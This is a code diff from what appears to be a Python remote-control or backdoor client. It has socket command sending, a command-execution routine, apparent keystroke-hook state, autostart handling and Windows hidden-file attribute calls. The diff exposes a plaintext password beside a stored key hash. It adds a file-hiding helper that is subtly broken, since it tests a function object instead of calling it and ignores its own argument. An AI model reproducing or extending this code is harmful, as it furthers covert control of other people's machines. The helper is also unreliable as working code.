@@ -13,7 +13,11 @@ active = False
 printf = ''
 hooked = {}
 loggingState = False
-passKey = r'1705a7f91b40320a19db18912b72148e'
+passKey = r'1705a7f91b40320a19db18912b72148e' # key: paroli123
+
+
+# INIT Widnows DLL's
+Kernel32 = ctypes.windll.kernel32
 
 def Send(sock, cmd, end="[ENDOFMESSAGE]"):
     sock.sendall((cmd + end).encode('utf-8'))
@@ -56,12 +60,18 @@ def Exec(cmde):
 
 def has_hidden_attribute(filepath):
     try:
-        attrs = ctypes.windll.kernel32.GetFileAttributesW(unicode(filepath))
+        attrs = Kernel32.GetFileAttributesW(unicode(filepath))
         assert attrs != -1
         result = bool(attrs & 2)
     except (AttributeError, AssertionError):
         result = False
     return result
+
+def set_content_attribute(filepath, hidden):
+    if has_hidden_attribute:
+        Kernel32.SetFileAttributesW(filepath, 1)
+    else:
+        Kernel32.SetFileAttributesW(filepath, 2)
 
 def fromAutostart():
     global active
